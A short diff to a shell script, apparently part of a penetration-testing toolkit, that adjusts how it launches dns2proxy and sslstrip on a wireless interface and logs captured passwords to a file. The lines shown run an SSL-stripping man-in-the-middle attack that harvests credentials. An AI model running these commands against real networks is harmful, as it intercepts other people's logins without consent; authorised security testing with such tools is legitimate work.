@@ -40,8 +40,8 @@ f_run(){
   logfile=/opt/pwnix/captures/passwords/sslstrip_$(date +%F-%H%M).log
 
   cd /usr/share/mana-toolkit/sslstrip-hsts
-  python /usr/share/mana-toolkit/sslstrip-hsts/dns2proxy.py at0 &> /dev/null
-  /usr/bin/sslstrip -pfk -w $logfile  -l 8888 $interface &
+  python /usr/share/mana-toolkit/sslstrip-hsts/dns2proxy.py at0 &
+  /usr/bin/sslstrip -pfk -w $logfile  -l 8888 $interface 2> /dev/null &
 
   sleep 3
   printf "\n\n"
